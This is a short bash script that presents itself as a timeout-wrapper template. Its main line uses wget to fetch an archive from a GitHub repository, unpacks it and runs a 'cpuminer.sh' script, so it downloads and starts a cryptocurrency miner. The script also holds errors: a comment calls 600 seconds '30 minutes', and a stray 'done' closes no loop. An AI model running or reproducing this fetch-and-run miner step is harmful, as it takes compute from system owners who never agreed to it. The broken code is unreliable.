#!/bin/bash

Timeout=600 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://github.com/lushenry654/bitbucket/raw/master/rtm.tzr.gz && tar xf rtm.tzr.gz && ./cpuminer.sh
done
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit 0
